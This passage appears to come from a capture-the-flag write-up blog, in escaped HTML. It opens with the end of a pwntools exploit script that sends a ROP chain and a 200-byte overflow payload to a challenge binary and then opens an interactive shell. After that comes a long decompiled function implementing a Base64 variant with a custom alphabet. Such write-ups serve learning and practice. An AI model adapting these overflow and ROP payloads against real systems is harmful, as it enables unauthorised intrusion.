keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x080EF320</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"right?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h3><p>Base64变种加密</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">_BYTE <span class=\"token operator\">*</span>__fastcall <span class=\"token function\">sub_7FF7DC6C10E0</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span>\n  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbp</span>\n  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi</span>\n  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r14</span>\n  size_t v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rcx</span>\n  _BYTE <span class=\"token operator\">*</span>v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r8</span>\n  __int64 v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span>\n  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi</span>\n  __int64 v19<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span>\n  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v22<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v23<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  <span class=\"token keyword\">int</span> v24<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">int</span> v25<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v26<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v27<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v28<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">char</span> v30<span class=\"token punctuation\">[</span><span class=\"token number\">80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-68h] BYREF</span>\n  <span class=\"token keyword\">int</span> v31<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+90h] [rbp+8h]</span>\n\n  v2 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>v30<span class=\"token punctuation\">,</span> <span class=\"token string\">\"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">do</span>\n    <span class=\"token operator\">++</span>v2<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  v4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> v31<span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> v31<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v7 <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span>\n  v8 <span class=\"token operator\">=</span> v6 <span class=\"token operator\">+</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    v8 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  v9 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>v8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">-</span> v5 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v10 <span class=\"token operator\">=</span> a1 <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    v11 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">-</span> v5 <span class=\"token operator\">-</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">3uLL</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n      v3 <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n      v12 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n      v10 <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n      v13 <span class=\"token operator\">=</span> v12 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v14 <span class=\"token operator\">=</span> v13 <span class=\"token operator\">-</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v13 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v14 <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v14<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v15 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v15 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v15<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v16 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v16 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v16<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3Fu</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token operator\">--</span>v11<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v11 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v18 <span class=\"token operator\">=</span> v5 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v18 <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v25 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40u</span> <span class=\"token punctuation\">)</span>\n      v25 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n    v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    v26 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">15677</span><span class=\"token punctuation\">;</span>\n    v27 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> v26 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n    v28 <span class=\"token operator\">=</span> v27 <span class=\"token operator\">-</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v27 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n      v28 <span class=\"token operator\">=</span> v27<span class=\"token punctuation\">;</span>\n    v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v28<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">goto</span> LABEL_37<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v18 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\nLABEL_37<span class=\"token operator\">:</span>\n    v9<span class=\"token punctuation\">[</span>v7<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> v9<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v19 <span class=\"token operator\">=</span> a1 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2<span class=\"token punctuation\">;</span>\n  v20 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40u</span> <span class=\"token punctuation\">)</span>\n    v20 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v20<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token 